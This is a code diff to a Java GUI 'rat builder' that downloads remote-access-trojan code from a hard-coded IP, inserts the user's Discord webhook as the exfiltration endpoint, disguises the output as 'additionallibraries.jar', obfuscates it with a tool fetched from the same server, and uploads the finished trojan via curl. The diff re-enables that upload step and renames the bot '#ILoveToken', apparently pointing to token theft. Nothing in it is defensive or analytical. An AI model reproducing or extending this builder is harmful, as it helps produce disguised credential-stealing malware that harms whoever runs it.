@@ -54,7 +54,7 @@ class Main extends JFrame implements ActionListener {
 
     public Main() {
         frame = new JFrame("rat builder");
-        JButton button = new JButton("click to build!");
+        JButton button = new JButton("Click to Build!");
         JButton button2 = new JButton("Obfuscation");
         button.addActionListener(this);
         button2.addActionListener(this);
@@ -90,7 +90,7 @@ class Main extends JFrame implements ActionListener {
                     try {
                         if (!Files.exists(Paths.get(appData + "\\ratter3\\build.zip", new String[0]), new LinkOption[0])) {
                             MessageWebhook("downloading rat code.");
-                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/build/"), new File(appData + "\\ratter3\\build.zip"));
+                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/dibuild/"), new File(appData + "\\ratter3\\build.zip"));
                         } else if (!Files.isDirectory(Paths.get(appData + "\\ratter3\\ratfiles", new String[0]), new LinkOption[0]) && Files.exists(Paths.get(appData + "\\ratter3\\build.zip", new String[0]), new LinkOption[0])) {
                             MessageWebhook("extracting rat code.");
                             extractZip(appData + "\\ratter3\\build.zip", (appData + "\\ratter3\\ratfiles"));
@@ -100,7 +100,7 @@ class Main extends JFrame implements ActionListener {
                             String textboxtextfixed = EncryptWebhook(textbox.getText().replace("canary.", "").replace("ptb.", ""));
                             if (this.noteditedhooker.booleanValue()) {
                                 MessageWebhook("editing rat webhook + recompiling rat.");
-                                Files.write(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
+                                Files.write(Paths.get(appData + "\\ratter3\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
                                 Map<String, String> env = new HashMap<>();
                                 env.put("create", "true");
                                 Path path = Paths.get(appData + "\\ratter3\\build.zip", new String[0]);
@@ -108,8 +108,8 @@ class Main extends JFrame implements ActionListener {
                                 FileSystem fs = FileSystems.newFileSystem(uri, env);
                                 Throwable th = null;
                                 try {
-                                    Path nf = fs.getPath("additionalslibraries\\Additionals_Libraries.class", new String[0]);
-                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0])), StandardOpenOption.CREATE);
+                                    Path nf = fs.getPath("additionallibraries\\Additional_Libraries.class", new String[0]);
+                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\ratter3\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0])), StandardOpenOption.CREATE);
                                     if (fs != null) {
                                         if (0 != 0) {
                                             try {
@@ -122,12 +122,12 @@ class Main extends JFrame implements ActionListener {
                                         }
                                     }
                                     System.out.println(appData);
-                                    FileUtils.copyFile(new File(appData + "\\ratter3\\build.zip"), new File(appData + "\\ratter3\\additionalslibraries.jar"));
+                                    FileUtils.copyFile(new File(appData + "\\ratter3\\build.zip"), new File(appData + "\\ratter3\\additionallibraries.jar"));
 
 
-                                    /*UploadFileToWebhook("@everyone rat done!: ", appData + "\\ratter3\\additionalslibraries.jar");
-                                    Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\ratter3\\additionalslibraries.jar\" \"" + textbox.getText() + "\"");
-*/
+                                    MessageWebhook("@everyone rat done!");
+                                    Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\ratter3\\additionallibraries.jar\" \"" + textbox.getText() + "\"");
+
                                     this.notdone = false;
                                 } catch (Throwable th3) {
                                     try {
@@ -152,7 +152,7 @@ class Main extends JFrame implements ActionListener {
                         }
                     } catch (IOException ex) {
                         System.out.println(ex);
-                        MessageWebhook("```" + ex + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
+                        MessageWebhook("```" + ex + "``` pls report this error! maksvavrik / soezbitch");
                     }
                 }
             }
@@ -170,7 +170,7 @@ class Main extends JFrame implements ActionListener {
                     try {
                         if (!Files.exists(Paths.get(appData + "\\fuscat\\build.zip", new String[0]), new LinkOption[0])) {
                             MessageWebhook("downloading rat code.");
-                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/build/"), new File(appData + "\\fuscat\\build.zip"));
+                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/dibuild/"), new File(appData + "\\fuscat\\build.zip"));
                         } else if (!Files.isDirectory(Paths.get(appData + "\\fuscat\\ratfiles", new String[0]), new LinkOption[0]) && Files.exists(Paths.get(appData + "\\fuscat\\build.zip", new String[0]), new LinkOption[0])) {
                             MessageWebhook("extracting rat code.");
                             extractZip(appData + "\\fuscat\\build.zip", (appData + "\\fuscat\\ratfiles"));
@@ -180,7 +180,7 @@ class Main extends JFrame implements ActionListener {
                             String textboxtextfixed = EncryptWebhook(textbox.getText().replace("canary.", "").replace("ptb.", ""));
                             if (this.noteditedhooker.booleanValue()) {
                                 MessageWebhook("editing rat webhook + recompiling rat.");
-                                Files.write(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
+                                Files.write(Paths.get(appData + "\\fuscat\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
                                 Map<String, String> env = new HashMap<>();
                                 env.put("create", "true");
                                 Path path = Paths.get(appData + "\\fuscat\\build.zip", new String[0]);
@@ -188,8 +188,8 @@ class Main extends JFrame implements ActionListener {
                                 FileSystem fs = FileSystems.newFileSystem(uri, env);
                                 Throwable th = null;
                                 try {
-                                    Path nf = fs.getPath("additionalslibraries\\Additionals_Libraries.class", new String[0]);
-                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0])), StandardOpenOption.CREATE);
+                                    Path nf = fs.getPath("additionallibraries\\Additional_Libraries.class", new String[0]);
+                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\fuscat\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0])), StandardOpenOption.CREATE);
                                     if (fs != null) {
                                         if (0 != 0) {
                                             try {
@@ -202,12 +202,12 @@ class Main extends JFrame implements ActionListener {
                                         }
                                     }
                                     System.out.println(appData);
-                                    FileUtils.copyFile(new File(appData + "\\fuscat\\build.zip"), new File(appData + "\\fuscat\\additionalslibraries.jar"));
+                                    FileUtils.copyFile(new File(appData + "\\fuscat\\build.zip"), new File(appData + "\\fuscat\\additionallibraries.jar"));
                                     MessageWebhook("Download fuscation!");
                                     FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/f/"), new File(appData + "\\fuscat\\f.jar"));
                                     MessageWebhook("Obfuscation!");
 
-                                    Process process = Runtime.getRuntime().exec("java -jar "+appData + "\\fuscat\\f.jar obfuscate "+appData + "\\fuscat\\additionalslibraries.jar\"");
+                                    Process process = Runtime.getRuntime().exec("java -jar "+appData + "\\fuscat\\f.jar obfuscate "+appData + "\\fuscat\\additionallibraries.jar\"");
                                     InputStream inputStream = process.getInputStream();
                                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
 
@@ -226,11 +226,11 @@ class Main extends JFrame implements ActionListener {
 
                                     // Выводим код завершения
                                     System.out.println("Exit Code: " + exitCode);
-                                    FileUtils.copyFile(new File(appData + "\\fuscat\\additionalslibraries.jar"),new File(appData + "\\fuscat\\F-additionalslibraries.jar"));
+                                    FileUtils.copyFile(new File(appData + "\\fuscat\\additionallibraries.jar-out.jar"),new File(appData + "\\fuscat\\F-additionallibraries.jar"));
 
 
                                     MessageWebhook("@everyone rat done!");
-                                    Process process2 =Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\fuscat\\F-additionalslibraries.jar\" \"" + textbox.getText() + "\"");
+                                    Process process2 =Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\fuscat\\F-additionallibraries.jar\" \"" + textbox.getText() + "\"");
                                     InputStream inputStream2 = process2.getInputStream();
                                     BufferedReader reader2 = new BufferedReader(new InputStreamReader(inputStream2));
 
@@ -272,13 +272,13 @@ class Main extends JFrame implements ActionListener {
                         }
                     } catch (IOException | InterruptedException ex) {
                         System.out.println(ex);
-                        MessageWebhook("```" + ex + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
+                        MessageWebhook("```" + ex + "``` pls report this error! maksvavrik / soezbitch");
                     }
                 }
             }
         } catch (IOException ex2) {
             System.out.println(ex2);
-            MessageWebhook("```" + ex2 + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
+            MessageWebhook("```" + ex2 + "``` pls report this error! maksvavrik / soezbitch");
         }
     }
     public static void extractZip(String zipFilePath, String destDirectory) throws IOException {
@@ -317,7 +317,7 @@ class Main extends JFrame implements ActionListener {
         }
     }
     private static String getString() throws IOException {
-        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
+        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\ratter3\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
         StringBuilder content = new StringBuilder();
         char[] buffer = new char[4096];
         while (true) {
@@ -330,7 +330,7 @@ class Main extends JFrame implements ActionListener {
             }
         }
     } private static String getString2() throws IOException {
-        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
+        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\fuscat\\ratfiles\\additionallibraries\\Additional_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
         StringBuilder content = new StringBuilder();
         char[] buffer = new char[4096];
         while (true) {
@@ -445,7 +445,7 @@ class Main extends JFrame implements ActionListener {
 
     public static void MessageWebhook(String stringtosend) {
         try {
-            DiscordMessage message = DiscordMessage.builder().withUsername("#iloveratted").withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png").withContent(stringtosend).build();
+            DiscordMessage message = DiscordMessage.builder().withUsername("#ILoveToken").withAvatar("https://www.oregonlive.com/resizer/Dq11GetNllJs6S43uAl9jOV_iqs=/1280x0/smart/advancelocal-adapter-image-uploads.s3.amazonaws.com/image.oregonlive.com/home/olive-media/width2048/img/ent_impact_home/photo/13627653-large.jpg").withContent(stringtosend).build();
             new WebhookAgent(textbox.getText()).execute(message);
         } catch (Exception e) {
         }
@@ -453,7 +453,7 @@ class Main extends JFrame implements ActionListener {
 
     public static void UploadFileToWebhook(String texttoupload, String filepath) {
         try {
-            DiscordMessage message = DiscordMessage.builder().withUsername("#iloveratted").withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png").withContent(texttoupload).addFile(new File(filepath)).build();
+            DiscordMessage message = DiscordMessage.builder().withUsername("#ILoveToken").withAvatar("https://www.oregonlive.com/resizer/Dq11GetNllJs6S43uAl9jOV_iqs=/1280x0/smart/advancelocal-adapter-image-uploads.s3.amazonaws.com/image.oregonlive.com/home/olive-media/width2048/img/ent_impact_home/photo/13627653-large.jpg").withContent(texttoupload).addFile(new File(filepath)).build();
             new WebhookAgent(textbox.getText()).execute(message);
         } catch (Exception e) {
         }
